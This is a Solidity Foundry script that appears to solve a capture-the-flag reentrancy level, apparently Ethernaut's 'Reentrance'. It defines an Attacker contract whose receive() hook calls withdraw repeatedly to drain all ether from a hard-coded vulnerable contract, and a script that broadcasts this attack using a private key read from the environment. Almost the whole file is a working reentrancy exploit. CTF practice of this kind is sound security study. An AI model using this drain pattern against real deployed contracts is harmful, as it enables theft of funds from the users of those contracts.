// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

import {Script, console} from "forge-std/Script.sol";
import { Reentrance } from "../src/Reentrance.sol";

contract Attacker {
    Reentrance public instance = Reentrance(payable(0xdABBc0d7DB7C4a4b50bDdb3b11c4e48f3E90ed52));


    constructor () public payable {
    }

    function attack() external {
        address(instance).call{value: 0.01 ether}(
            abi.encodeWithSignature(
                "donate(address)", address(this)
                )
            );
        instance.withdraw(0.01 ether);
    }

    receive () external payable {
        while (address(instance).balance > 0.01 ether)
            instance.withdraw(0.01 ether);
        instance.withdraw(address(instance).balance);
    }

}

contract ReentranceSolver is Script {

    Reentrance public instance = Reentrance(0xdABBc0d7DB7C4a4b50bDdb3b11c4e48f3E90ed52);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function run() external {
        vm.startBroadcast(prv);
        
        address b;

        b = address(uint160(0xdABBc0d7DB7C4a4b50bDdb3b11c4e48f3E90ed52.balance));
        console.logAddress(b);
        Attacker a = new Attacker{value: 0.01 ether}();
        a.attack();
        b = address(uint160(0xdABBc0d7DB7C4a4b50bDdb3b11c4e48f3E90ed52.balance));
        console.logAddress(b);

        vm.stopBroadcast();
    }

}
